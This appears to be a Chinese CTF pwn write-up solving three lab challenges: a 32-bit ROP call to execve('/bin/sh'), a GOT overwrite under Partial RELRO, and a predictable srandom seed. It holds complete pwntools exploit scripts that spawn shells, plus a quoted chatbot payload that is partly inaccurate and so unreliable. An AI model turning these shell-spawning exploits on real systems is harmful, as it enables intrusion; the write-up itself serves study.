+<h1 id="题目：这是什么？32-bit！​"><a href="#题目：这是什么？32-bit！​" class="headerlink" title="题目：这是什么？32-bit！​"></a>题目：<code>这是什么？32-bit！</code>​</h1><p>Linux 遵循的 AMD64 System V ABI 使用 6 个寄存器（rdi、rsi…）传递函数参数，参数数量大于 6 个时才继续使用栈传递参数。然而 32 位程序只使用栈传递参数，参数从右至左依次入栈。</p>
+<p><img src="/assets/4-20250404172051-vqb2pvb.png" alt="4"></p>
+<p>程序附件是32位小端序</p>
+<p>main()函数长这样</p>
+<p><img src="/./../images/1-20250404171726-sdg3kmz.png" alt="1"></p>
+<p>vuln()函数长这样</p>
+<p><img src="/./../images/2-20250404171818-pmuos5q.png" alt="2">​</p>
+<p>先来了个getchar()，再 scanf 输入数据到变量v1中</p>
+<p>有后门函数backdoor(),去看看</p>
+<p><img src="/./../images/3-20250404171933-4xj0okz.png" alt="3"></p>
+<p>有 execve()但参数是错的</p>
+<blockquote>
+<h3 id="execve-​-函数详解"><a href="#execve-​-函数详解" class="headerlink" title="execve()​ 函数详解"></a><code>execve()</code>​ 函数详解</h3><p><code>execve()</code>​ 是 Unix&#x2F;Linux 系统中的一个重要系统调用，用于执行一个新的程序。它会用指定的程序完全替换当前进程的内存空间。</p>
+<h4 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int execve(const char *path, char *const argv[], char *const envp[]);</span><br></pre></td></tr></table></figure>
+
+<h4 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h4><ol>
+<li><p><strong>​<code>path</code>​</strong>:</p>
+<ul>
+<li>要执行的可执行文件的完整路径</li>
+<li>例如：<code>/bin/ls</code>​, <code>/usr/bin/env</code>​</li>
+</ul>
+</li>
+<li><p><strong>​<code>argv</code>​</strong>​ (参数向量):</p>
+<ul>
+<li>字符串指针数组，表示传递给新程序的参数</li>
+<li>第一个参数通常是程序名称本身</li>
+<li>数组必须以 <code>NULL</code>​ 指针结尾</li>
+<li>例如：<code>&#123;&quot;ls&quot;, &quot;-l&quot;, NULL&#125;</code>​</li>
+</ul>
+</li>
+<li><p><strong>​<code>envp</code>​</strong>​ (环境变量):</p>
+<ul>
+<li>字符串指针数组，表示新程序的环境变量</li>
+<li>每个字符串通常是 <code>&quot;VAR=value&quot;</code>​ 形式</li>
+<li>数组必须以 <code>NULL</code>​ 指针结尾</li>
+<li>可以传递 <code>environ</code>​ 全局变量来继承当前环境</li>
+</ul>
+</li>
+</ol>
+<h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><ul>
+<li>成功时：不返回（因为原进程已被替换）</li>
+<li>失败时：返回 -1，并设置 <code>errno</code>​</li>
+</ul>
+</blockquote>
+<p>shift+F12查看字符串</p>
+<p><img src="/./../images/5-20250404173149-krx9ogj.png" alt="5">​</p>
+<p>程序存在&#x2F;bin&#x2F;sh，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./backdoor&#x27;)</span><br><span class="line">elf = ELF(&#x27;./backdoor&#x27;)</span><br><span class="line">payload = b&#x27;a&#x27;(0x28) + b&#x27;b&#x27;4</span><br><span class="line">payload += flat([</span><br><span class="line">    elf.sym[&#x27;execve&#x27;],            # `vuln` 返回地址</span><br><span class="line">    0,                            # `execve` 返回地址</span><br><span class="line">    next(elf.search(b&#x27;/bin/sh&#x27;)), # `execve` 参数 `pathname`</span><br><span class="line">    0,                            # `execve` 参数 `argv`</span><br><span class="line">    0,                            # `execve` 参数 `envp`</span><br><span class="line">])</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline() # getchar()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-​payload-flat-​-​"><a href="#1-​payload-flat-​-​" class="headerlink" title="1.​payload += flat([ ... ])​ ​"></a>1.<strong>​<code>payload += flat([ ... ])</code>​</strong> ​</h3><ul>
+<li><p><strong>​<code>flat([...])</code>​</strong> ​：</p>
+<ul>
+<li><code>flat()</code>​ 是 <code>pwntools</code>​ 提供的函数，用于将多个值打包成二进制数据（自动处理大小端）。</li>
+<li>这里构造的是 <strong>ROP 链</strong>，用于调用 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>​。</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-​e-search-b-bin-sh-​-​-的作用"><a href="#2-​e-search-b-bin-sh-​-​-的作用" class="headerlink" title="2.  ​e.search(b&#39;/bin/sh&#39;)​ ​ 的作用"></a><strong>2.</strong>  <strong>​<code>e.search(b&#39;/bin/sh&#39;)</code>​</strong> ​ <strong>的作用</strong></h3><ul>
+<li><strong>​<code>e</code>​</strong>​ 是 <code>ELF</code>​ 对象（通过 <code>ELF(&quot;./binary&quot;)</code>​ 加载），代表目标二进制文件。</li>
+<li><strong>​<code>e.search(b&#39;/bin/sh&#39;)</code>​</strong> ​ 会 <strong>在二进制文件的所有可读内存段（如</strong>  <strong>​<code>.text</code>​</strong>​ **、**​ <strong>​<code>.data</code>​</strong>​ **、**​ <strong>​<code>.rodata</code>​</strong>​ <strong>）中搜索字节序列</strong> <strong>​<code>b&#39;/bin/sh&#39;</code>​</strong> ​。</li>
+<li>它返回一个 <strong>生成器（generator）</strong> ，包含所有匹配的地址。</li>
+</ul>
+<hr>
+<h3 id="3-​next-​-​-的作用"><a href="#3-​next-​-​-的作用" class="headerlink" title="3.  ​next()​ ​ 的作用"></a><strong>3.</strong>  <strong>​<code>next()</code>​</strong> ​ <strong>的作用</strong></h3><ul>
+<li><code>e.search()</code>​ 返回的是 <strong>生成器</strong>（可能有多个匹配项），但我们通常只需要 <strong>第一个匹配的地址</strong>。</li>
+<li><strong>​<code>next()</code>​</strong> ​ 用于获取生成器的 <strong>第一个结果</strong>（即第一个 <code>/bin/sh</code>​ 的地址）。</li>
+<li>如果没有找到 <code>/bin/sh</code>​，<code>next()</code>​ 会抛出 <code>StopIteration</code>​ 异常（说明需要换其他方法，比如从 libc 里找）。</li>
+</ul>
+<h1 id="题目：这是什么？GOT！​"><a href="#题目：这是什么？GOT！​" class="headerlink" title="题目：这是什么？GOT！​"></a>题目：<code>这是什么？GOT！</code>​</h1><p>现代 Linux 可执行文件基本都是<em>动态链接</em>的 ELF 格式文件。大多数程序运行时都需要使用外部库函数（<code>libc</code>​！），动态连接器 <code>ld</code>​ 架起了程序与动态链接库之间的桥梁。程序内部的 GOT（全局偏移表）负责记录这些库函数真正的地址或用于调用动态链接器的 PLT（过程链接表）项地址（首次调用前）。动态链接程序运行时不直接调用库函数，而是调用 PLT 项。在未完全开启 RELRO（重定向只读）保护时，我们可以在运行时修改 GOT！</p>
+<blockquote>
+<p>试着在静态分析软件里实际看看这两个表，再动态调试单步进入走一遍动态链接库函数的调用过程。</p>
+</blockquote>
+<p>拿到附件，先看看有啥保护？ GOT表（一般GOT表都是默认是指 <strong>got.plt</strong> 节）可写</p>
+<p><img src="/./../images/1-20250405194654-8l7pfxa.png" alt="1">​</p>
+<blockquote>
+<h1 id="Partial-RELRO-RELocation-Read-Only-详解"><a href="#Partial-RELRO-RELocation-Read-Only-详解" class="headerlink" title="Partial RELRO (RELocation Read-Only) 详解"></a>Partial RELRO (RELocation Read-Only) 详解</h1><p>Partial RELRO 是一种二进制安全缓解技术，属于 RELRO（重定位表只读）的”部分启用”模式，旨在提高程序安全性但不如 Full RELRO 严格。</p>
+<h2 id="核心特点"><a href="#核心特点" class="headerlink" title="核心特点"></a>核心特点</h2><ol>
+<li><p><strong>GOT 保护机制</strong>：</p>
+<ul>
+<li><strong>.got 节（非延迟绑定的函数表）</strong> ：设置为只读</li>
+<li><strong>.got.plt 节（延迟绑定的函数表，如 libc 函数）</strong> ：保持可写</li>
+</ul>
+</li>
+<li><p><strong>加载时行为</strong>：</p>
+<ul>
+<li>程序启动时解析所有非延迟绑定的符号地址（如全局变量）</li>
+<li>延迟绑定的函数（如 libc 函数）仍在使用时才解析</li>
+</ul>
+</li>
+<li><p><strong>安全影响</strong>：</p>
+<ul>
+<li>防止覆盖已解析的非延迟绑定符号</li>
+<li>仍允许修改 .got.plt 中的函数指针（如 <code>printf@got.plt</code>​）</li>
+</ul>
+</li>
+</ol>
+<h2 id="与-Full-RELRO-对比"><a href="#与-Full-RELRO-对比" class="headerlink" title="与 Full RELRO 对比"></a>与 Full RELRO 对比</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Partial RELRO</th>
+<th>Full RELRO</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.got.plt 可写性</td>
+<td>可写</td>
+<td>只读</td>
+</tr>
+<tr>
+<td>延迟绑定</td>
+<td>启用</td>
+<td>禁用</td>
+</tr>
+<tr>
+<td>启动性能</td>
+<td>较快</td>
+<td>较慢（全部预先解析）</td>
+</tr>
+<tr>
+<td>安全强度</td>
+<td>中等</td>
+<td>最高</td>
+</tr>
+<tr>
+<td>对抗 GOT 覆盖攻击</td>
+<td>部分防护</td>
+<td>完全防护</td>
+</tr>
+</tbody></table>
+</blockquote>
+<p>看看 main() 函数</p>
+<p><img src="/./../images/2-20250405195237-0j4ltzl.png" alt="2">​</p>
+<p>没有变量，但read() 函数读入的数据指向一个内存地址&amp;off_404000，可以去看看。</p>
+<p><img src="/./../images/3-20250405200029-nt84r2c.png" alt="3"></p>
+<p>我们点击&amp;off_404000后，发现它是 GOT&#x2F;PLT 表中 puts 函数的入口地址 0x404000</p>
+<blockquote>
+<h1 id="问问Deepseek，了解一下-off-404000："><a href="#问问Deepseek，了解一下-off-404000：" class="headerlink" title="问问Deepseek，了解一下 off_404000："></a>问问Deepseek，了解一下 off_404000：</h1><h3 id="1-符号-​off-404000​​-的含义"><a href="#1-符号-​off-404000​​-的含义" class="headerlink" title="1. 符号 ​off_404000​​ 的含义"></a><strong>1. 符号</strong> <strong>​<code>off_404000</code>​</strong>​ <strong>的含义</strong></h3><ul>
+<li><strong>​<code>off_404000</code>​</strong>​ 是一个标签（label），代表 <code>puts</code>​ 函数在 <strong>GOT&#x2F;PLT 表中的条目地址</strong>（<code>0x404000</code>​）。</li>
+<li>它的值是 <code>offset puts</code>​，即动态链接后 <code>puts</code>​ 函数的实际地址会被填充到这里（初始时指向 PLT 的解析逻辑）。</li>
+</ul>
+<hr>
+<h3 id="2-​-off-404000​​-的解析"><a href="#2-​-off-404000​​-的解析" class="headerlink" title="2.   ​&amp;off_404000​​ 的解析"></a><strong>2.</strong>   <strong>​<code>&amp;off_404000</code>​</strong>​ <strong>的解析</strong></h3><ul>
+<li><strong>​<code>&amp;</code>​</strong> ​ <strong>是取地址运算符</strong>，所以 <code>&amp;off_404000</code>​ 直接获取符号 <code>off_404000</code>​ 的地址。</li>
+<li>由于 <code>off_404000</code>​ 本身的地址是 <code>0x404000</code>​，因此 <code>&amp;off_404000 = 0x404000</code>​。</li>
+</ul>
+<hr>
+<h3 id="3-结合题目代码的漏洞点"><a href="#3-结合题目代码的漏洞点" class="headerlink" title="3. 结合题目代码的漏洞点"></a><strong>3. 结合题目代码的漏洞点</strong></h3><p>在题目中：</p>
+<p>c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0, &amp;off_404000, 0x40uLL); // 向地址 0x404000 写入最多 64 字节数据</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>攻击者可以向</strong> <strong>​<code>0x404000</code>​</strong>​ <strong>写入数据</strong>，覆盖从 <code>puts</code>​ 开始的连续 GOT 表项（包括 <code>write</code>​、<code>system</code>​、<code>printf</code>​ 等）。</li>
+<li>因为 GOT 表项是连续的，写入 <code>0x40</code>​（64）字节可以覆盖到 <code>exit</code>​ 的 GOT 表项（<code>0x404038</code>​）。</li>
+</ul>
+<hr>
+<h3 id="4-GOT-表结构示意图"><a href="#4-GOT-表结构示意图" class="headerlink" title="4. GOT 表结构示意图"></a><strong>4. GOT 表结构示意图</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">地址        内容（初始指向 PLT 解析逻辑）</span><br><span class="line">0x404000   off_404000 -&gt; puts</span><br><span class="line">0x404008   off_404008 -&gt; write</span><br><span class="line">0x404010   off_404010 -&gt; system</span><br><span class="line">0x404018   off_404018 -&gt; printf</span><br><span class="line">0x404020   off_404020 -&gt; alarm</span><br><span class="line">0x404028   off_404028 -&gt; read</span><br><span class="line">0x404030   off_404030 -&gt; setvbuf</span><br><span class="line">0x404038   off_404038 -&gt; exit</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-为什么这是关键漏洞？"><a href="#5-为什么这是关键漏洞？" class="headerlink" title="5. 为什么这是关键漏洞？"></a><strong>5. 为什么这是关键漏洞？</strong></h3><ul>
+<li><strong>GOT 表可写</strong>（Partial RELRO 下）：通过覆盖 <code>exit</code>​ 的 GOT 表项（<code>0x404038</code>​），可以将其改为 <code>system</code>​ 的地址（<code>0x404010</code>​）。</li>
+<li>当程序调用 <code>exit(0)</code>​ 时，实际会跳转到 <code>system</code>​ 函数，如果此时栈上或寄存器中有 <code>/bin/sh</code>​ 字符串，就能获得 shell。</li>
+</ul>
+<hr>
+<h3 id="6-攻击-Payload-示例"><a href="#6-攻击-Payload-示例" class="headerlink" title="6. 攻击 Payload 示例"></a><strong>6. 攻击 Payload 示例</strong></h3><p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># 覆盖从 puts 开始的 GOT 表项</span><br><span class="line">payload = p64(0x404010)  # 覆盖 puts -&gt; system</span><br><span class="line">payload += p64(0x404010) # 覆盖 write -&gt; system</span><br><span class="line">payload += p64(0x404010) # 覆盖 system -&gt; system（占位）</span><br><span class="line">payload += p64(0x404010) # 覆盖 printf -&gt; system</span><br><span class="line">payload += p64(0x404010) # 覆盖 exit -&gt; system</span><br><span class="line"></span><br><span class="line"># 发送 payload 后，程序调用 exit(0) 时会实际执行 system(0)</span><br><span class="line"># 若在输入中传入 &quot;/bin/sh\x00&quot;，且 rdi 指向它，即可获取 shell</span><br><span class="line">p.send(payload + b&quot;/bin/sh\x00&quot;)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
+<li><code>&amp;off_404000</code>​ 是地址 <code>0x404000</code>​，即 GOT 表中 <code>puts</code>​ 的条目地址。</li>
+<li>通过覆盖 GOT 表，可以劫持函数调用流，这是 Partial RELRO 下的常见攻击手法。</li>
+</ul>
+</blockquote>
+<p>程序调用完 read() 函数后，就直接调用 exit() 函数，结束程序</p>
+<p>通过覆盖 <code>exit</code>​ 的 GOT 表项（<code>0x404038</code>​），可以将其改为 <code>system</code>​ 的地址（<code>0x404010</code>​）。</p>
+<p>当程序调用 <code>exit(0)</code>​ 时，实际会跳转到 <code>system</code>​ 函数，如果此时栈上或寄存器中有 <code>/bin/sh</code>​ 字符串，就能获得 shell。</p>
+<p>shift + F12 看看字符串String</p>
+<p><img src="/./../images/4-20250405201308-7taih9f.png" alt="4">​</p>
+<p>既有 systen() 函数，又有 &#x2F;bin&#x2F;sh ，可以期待一下程序会不会直接给出后门函数了，把右边的函数列表一个一个给点开看看，</p>
+<p><img src="/./../images/5-20250405202055-sdfyprc.png" alt="5">​</p>
+<p>这不就有了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#io = process(&#x27;./pregot&#x27;)</span><br><span class="line">io = remote(&#x27;192.168.75.1&#x27;, 62438)</span><br><span class="line">elf = ELF(&#x27;./pregot&#x27;)</span><br><span class="line"></span><br><span class="line">unreachable = 0x401196</span><br><span class="line">#system = elf.plt[&#x27;system&#x27;]</span><br><span class="line">system = 0x401056</span><br><span class="line"></span><br><span class="line">payload = p64(system)*7 + p64(unreachable)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.recvuntil(&quot;This is `puts`.\n&quot;)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="划重点："><a href="#划重点：" class="headerlink" title="划重点："></a><strong>划重点：</strong></h2><p><strong>1.（从大神uf4te的博客</strong>​<a target="_blank" rel="noopener" href="https://www.uf4te.cn/posts/29133b28.html">PLT表和GOT表 | 坠入星野的月🌙</a>​<strong>上搬下来的知识点，讲的不是这道题，但没关系，学的是知识）</strong></p>
+<ul>
+<li><ol>
+<li><code>elf.plt[&#39;write&#39;]</code>​ 输出的地址为 0x401030，与 IDA 中 <code>_write</code>​ 地址相同，即 .plt 地址</li>
+<li><code>elf.got[&#39;write&#39;]</code>​ 输出的地址为 0x404018，该地址存放了真正的 <code>write()</code>​ 函数地址，在 IDA 中为 <code>write</code>​ 的 .got.plt 地址</li>
+<li><code>elf.symbols[&#39;write&#39;]</code>​ 输出的地址为 0x401030，与 <code>write()</code>​ 函数的 PLT 地址相同</li>
+<li><code>elf.symbols[&#39;main&#39;]</code>​ 输出的地址为 0x401153，为 <code>main()</code>​ 函数的地址，与 IDA 中 <code>main()</code>​ 函数地址相同</li>
+</ol>
+</li>
+<li><p>由此可见：</p>
+<ol>
+<li><code>elf.plt[]</code>​ 获取动态链接库中的函数的 .plt 地址</li>
+<li><code>elf.got[]</code>​ 获取动态链接库中的函数的 .got.plt 地址</li>
+<li><code>elf.symbols[]</code>​ 获取程序本身的函数的地址，用于动态链接库中的函数时，获取的是 PLT 地址</li>
+</ol>
+</li>
+</ul>
+<p><strong>2.为什么我在脚本里写入system_addr &#x3D; elf.plt[‘system’]无法getshell，改为system_addr &#x3D; 0x401056就可以getshell（这里就涉及到 PLT 条目的结构细节）</strong></p>
+<p>我最初的脚本是这样写的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = process(&#x27;./pregot&#x27;)</span><br><span class="line">#io = remote(&#x27;192.168.75.1&#x27;, 62438)</span><br><span class="line">elf = ELF(&#x27;./pregot&#x27;)</span><br><span class="line"></span><br><span class="line">unreachable = 0x401196</span><br><span class="line">system = elf.plt[&#x27;system&#x27;] ！！！！！！！！！！！！！！！！！！！！！！！！！（这加 ！仅仅是为了强调）</span><br><span class="line"></span><br><span class="line">payload = p64(system)*7 + p64(unreachable)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.recvuntil(&quot;This is `puts`.\n&quot;)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>结果：getshell 失败</p>
+<p><img src="/./../images/6-20250405205923-qsn4z02.png" alt="6"></p>
+<p>这里可以从DEBUG给出的信息看看，我用于覆盖地址的system &#x3D; elf.plt [‘system’] &#x3D; 0x00000000000401050(前面的00没影响，简记为0x401050)（从左往右一个字节一个字节的取下来）</p>
+<p>修改过后的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = process(&#x27;./pregot&#x27;)</span><br><span class="line">#io = remote(&#x27;192.168.75.1&#x27;, 62438)</span><br><span class="line">elf = ELF(&#x27;./pregot&#x27;)</span><br><span class="line"></span><br><span class="line">unreachable = 0x401196</span><br><span class="line">#system = elf.plt[&#x27;system&#x27;]</span><br><span class="line">system = 0x401056   ！！！！！！！！！！！！！！！！！！！！！！！！！（这加 ！仅仅是为了强调）</span><br><span class="line"></span><br><span class="line">payload = p64(system)*7 + p64(unreachable)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.recvuntil(&quot;This is `puts`.\n&quot;)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/7-20250405210959-29nkh6s.png" alt="7"></p>
+<p><strong>那么问题来了，0x401050和0x401056 分别在哪里？</strong></p>
+<p><img src="/./../images/8-20250405211417-t3y376f.png" alt="8"></p>
+<blockquote>
+<h2 id="关于-PLT-跳转地址选择问题的分析"><a href="#关于-PLT-跳转地址选择问题的分析" class="headerlink" title="关于 PLT 跳转地址选择问题的分析"></a>关于 PLT 跳转地址选择问题的分析</h2><p>下面我将详细解释为什么 <code>0x401056</code>​ 能成功而 <code>0x401050</code>​ 不能。</p>
+<h3 id="PLT-条目结构解析"><a href="#PLT-条目结构解析" class="headerlink" title="PLT 条目结构解析"></a>PLT 条目结构解析</h3><p>对于 <code>system</code>​ 函数的 PLT 条目：</p>
+<p>asm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_system proc near</span><br><span class="line">    jmp     cs:off_404010  ; 第一次跳转到 GOT 表（初始指向下一行）</span><br><span class="line">    push    2              ; 函数在重定位表中的索引</span><br><span class="line">    jmp     sub_401020     ; 跳转到动态链接器解析函数</span><br><span class="line">_system endp</span><br></pre></td></tr></table></figure>
+
+<h3 id="关键区别"><a href="#关键区别" class="headerlink" title="关键区别"></a>关键区别</h3><ol>
+<li><p><strong>​<code>0x401050</code>​</strong>​  <strong>(第一条指令)</strong></p>
+<ul>
+<li>这是 PLT 的常规入口点</li>
+<li>第一次调用时会跳转到 GOT 表（初始指向 <code>push 2</code>​ 指令）</li>
+<li>之后会通过动态链接器解析真实地址</li>
+<li><strong>直接跳转到这里会导致无限循环</strong>：因为 GOT 未初始化时会指回 PLT，PLT又会指向GOT</li>
+</ul>
+</li>
+<li><p><strong>​<code>0x401056</code>​</strong>​  <strong>(push 指令)</strong></p>
+<ul>
+<li>这是动态链接的解析路径入口</li>
+<li>跳过第一条 <code>jmp</code>​ 指令</li>
+<li>强制触发动态链接器解析函数地址</li>
+<li><strong>解析完成后，GOT 表会被填充为真实地址</strong></li>
+</ul>
+</li>
+</ol>
+<h3 id="为什么第二个能成功？"><a href="#为什么第二个能成功？" class="headerlink" title="为什么第二个能成功？"></a>为什么第二个能成功？</h3><ol>
+<li><p><strong>强制解析机制</strong>：</p>
+<ul>
+<li>跳转到 <code>0x401056</code>​ 会直接执行 <code>push 2; jmp resolver</code>​</li>
+<li>动态链接器会填充 <code>system</code>​ 的真实地址到 GOT 表</li>
+<li>后续调用就能直接跳转到真实 <code>system</code>​</li>
+</ul>
+</li>
+<li><p><strong>避免循环</strong>：</p>
+<ul>
+<li>跳转到 <code>0x401050</code>​ 会导致 PLT→GOT→PLT 的循环</li>
+<li>而 <code>0x401056</code>​ 直接进入解析流程</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul>
+<li><code>0x401050</code>​ 是常规 PLT 入口，依赖已解析的 GOT 表</li>
+<li><code>0x401056</code>​ 是解析路径入口，强制动态链接器工作</li>
+<li>在漏洞利用中，明确你需要的执行路径非常重要</li>
+</ul>
+<p>这种细微差别正是二进制漏洞利用中需要特别注意的地方，理解 PLT&#x2F;GOT 的工作机制对成功利用至关重要。</p>
+<p>‍</p>
+<h1 id="题目：这是什么？random！​"><a href="#题目：这是什么？random！​" class="headerlink" title="题目：这是什么？random！​"></a>题目：<code>这是什么？random！</code>​</h1><p>你知道吗？计算机中很多所谓随机都是“伪随机”，生成随机数前需要提供“种子”，如果种子一样算法一样那么生成的随机数就一样！然而还有些“真随机”，无需种子也无法预测。</p>
+<blockquote>
+<p>你需要在 GNU&#x2F;Linux 环境中模拟随机过程，不同环境对 <code>random</code>​ 的实现可能不同。</p>
+</blockquote>
+<p><img src="/./../images/10-20250413181621-2grw4q1.png" alt="10"></p>
+<p>你只要在三次猜数字的环节中<strong>至少猜对一个</strong>，你就能看到 flag（因为程序最后还是会输出 flag）。</p>
+<h3 id="🔢-第一阶段：循环猜数字"><a href="#🔢-第一阶段：循环猜数字" class="headerlink" title="🔢 第一阶段：循环猜数字"></a>🔢 第一阶段：循环猜数字</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( tests-- )</span><br><span class="line">&#123;</span><br><span class="line">  secret = random() % <span class="number">90000</span> + <span class="number">10000</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;guess);</span><br><span class="line">  <span class="keyword">if</span> ( guess != secret )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wow, you are right!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里用的是 <code>random()</code>​，种子是前面设定的：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timer = time(<span class="number">0LL</span>);</span><br><span class="line">v3 = localtime(&amp;timer);</span><br><span class="line">srandom(v3-&gt;tm_yday);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>srandom(v3-&gt;tm_yday);</code>​ 也就是说，种子是<strong>今天是一年中的第几天</strong>（<code>tm_yday</code>​），这个值是 0~365 的整数，<strong>极其容易爆破！</strong></li>
+</ul>
+<p>✅ <strong>利用方式</strong>：</p>
+<ul>
+<li>我们可以写一个小脚本模拟这个 <code>random()</code>​ 的过程，从 0 到 365 爆破一天，然后尝试预测 <code>random()</code>​ 生成的数字，猜中即通过。</li>
+</ul>
+<blockquote>
+<p>当然你还要知道 <code>tests</code>​ 是多少次循环，可以通过静态分析（或调试）确认。</p>
+<p><img src="/assets/11-20250413181830-w2xb4t7.png" alt="11"></p>
+<h4 id="dq-0Ah​-的含义"><a href="#dq-0Ah​-的含义" class="headerlink" title="dq 0Ah​ 的含义"></a><code>dq 0Ah</code>​ 的含义</h4><ul>
